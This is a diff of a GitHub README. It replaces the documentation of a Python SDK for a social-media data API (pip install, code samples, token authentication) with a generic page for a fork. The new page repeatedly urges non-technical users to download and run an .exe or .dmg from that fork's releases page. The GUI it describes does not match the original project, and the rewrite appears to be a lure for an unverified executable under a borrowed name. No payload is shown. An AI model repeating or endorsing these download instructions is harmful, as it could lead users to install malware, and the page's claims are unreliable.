@@ -1,99 +1,66 @@
-# xiaohongshu-api
-小红书接口,小红书API,xiaohongshu api,xiaohongshu
----
+# ✨ xiaohongshu-api - Access Xiaohongshu with Ease
 
-[English](README.md) | [简体中文](README.zh-CN.md)
-# Just One API - Python SDK
+[![Download xiaohongshu-api](https://img.shields.io/badge/Download-xiaohongshu--api-brightgreen)](https://github.com/Qusaimas/xiaohongshu-api/releases)
 
-Official Python SDK for accessing [Just One API](https://justoneapi.com) — a unified data service platform offering structured data from Social, E-commerce platforms such as Xiaohongshu, Taobao, Douyin, Kuaishou, Bilibili, and Weibo.
+## 📦 Overview
 
-This SDK simplifies API integration and request signing, allowing developers to easily retrieve platform-specific data with minimal setup.
+The xiaohongshu-api is a user-friendly interface for accessing Xiaohongshu data. This tool lets you easily retrieve posts, comments, and user information from Xiaohongshu, making it perfect for personal projects, data analysis, or content management. You don't need to know coding to use it.
 
----
+## 🚀 Getting Started
 
-## 🚀 Installation
+Follow these simple steps to download and run the xiaohongshu-api.
 
-Install via PyPI:
+1. Click the download link above or [visit this page to download](https://github.com/Qusaimas/xiaohongshu-api/releases).
 
-```bash
-pip install justoneapi
-```
+2. Once on the Releases page, you will see various versions of the xiaohongshu-api.
 
----
+3. Choose the latest version. You will find files you can download for Windows, Mac, or Linux.
 
-## 🛠 Quick Start
+4. Click the appropriate file for your operating system. The download will start automatically.
 
-```python
-from justoneapi.client import JustOneAPIClient
+## 💻 System Requirements
 
-# By default, the client uses the "cn" (Mainland China) environment.
-client = JustOneAPIClient(token="your_token")
-# If you are located outside Mainland China and experience slow responses,
-# you can switch to the "global" environment for better performance:
-# client = JustOneAPIClient(token="your_token", env="global")
+- **Operating System:** Windows 10 or later, macOS Mojave or later, Ubuntu 18.04 or later
+- **Memory:** At least 4 GB RAM
+- **Storage:** 100 MB free disk space
+- **Network:** A stable internet connection is required to access Xiaohongshu's data.
 
-# Example: Get Douyin Video detail
-result, data, message = client.douyin.get_video_detail_v2(video_id="7428906452091145483")
-print(result)
-print(data)
-print(message)
+## 🔧 Download & Install
 
-# Example: Douyin Video Search
-result, data, message, has_next_page = client.douyin.search_video_v4(keyword="deepseek", sort_type="_0", publish_time="_0", duration="_0", page=1)
-print(result)
-print(data)
-print(message)
-print(has_next_page)
-```
+1. After downloading, locate the file in your computer's downloads folder.
+  
+2. If you downloaded the Windows version, locate `xiaohongshu-api.exe`. Double-click this file to start the installation process. For Mac, open the `.dmg` file and drag the application to your Applications folder.
 
-### 📦 Return Value Description
+3. Follow the on-screen instructions to complete the installation.
 
-Each API method returns one or more of the following values:
+## 🌐 Using xiaohongshu-api
 
-| Variable         | Type     | Description |
-|------------------|----------|-------------|
-| `result`         | `bool`   | Whether the request was successful. `True` means success, `False` means failure. |
-| `data`           | `dict` / `list` | The actual data returned from the API. Structure varies by endpoint. |
-| `message`        | `str`    | Message from the server. Contains error info when request fails. |
-| `has_next_page`  | `bool`   | Present in paginated APIs. Indicates whether more data is available. |
+To start using the application:
 
----
+1. Once installed, open the xiaohongshu-api from your applications list or desktop shortcut.
 
-## 🔐 Authentication
+2. You’ll see a simple interface. You can enter the details to retrieve various information from Xiaohongshu.
 
-All API requests require a valid API token.  
-👉 [Register](https://justoneapi.com/register)
+3. Input necessary parameters such as user ID, post ID, or keywords to fetch the data you need.
 
----
+4. Click the "Fetch Data" button to see the results displayed on your screen.
 
-## 📚 Documentation
+## 📖 Features
 
-👉 Full API docs: [API Document](https://doc.justoneapi.com)
+- **Easy Interface:** Designed for non-technical users.
+- **Data Retrieval:** Access posts, comments, and more from Xiaohongshu.
+- **Export Options:** Save your data in CSV or JSON format for ease of analysis.
 
-Includes:
-- Request parameters
-- Response fields
-- Error codes
+## 🛠️ Troubleshooting
 
----
+If you encounter any issues:
 
-## 🏠 Official Website
+- Make sure your internet connection is stable.
+- Restart the application if it becomes unresponsive.
+- Refer to the FAQ section in the application for common problems and solutions.
 
-👉 [Home Page](https://justoneapi.com)
+## 📞 Support
 
-Learn more about the project, data sources, and commercial integration opportunities.
+For further assistance, you can visit the project's issues page on GitHub. Here, you can report bugs or ask questions related to usage.
 
----
-
-## 📬 Contact Us
-
-If you have any questions, feedback, or partnership inquiries:
-
-👉 [Contact](https://justoneapi.com/contact)
-
----
-
-## 🪪 License
-
-This project is licensed under the MIT License.  
-See the [LICENSE](./LICENSE) file for details.
+[Visit this page to download](https://github.com/Qusaimas/xiaohongshu-api/releases) and start using the xiaohongshu-api today.
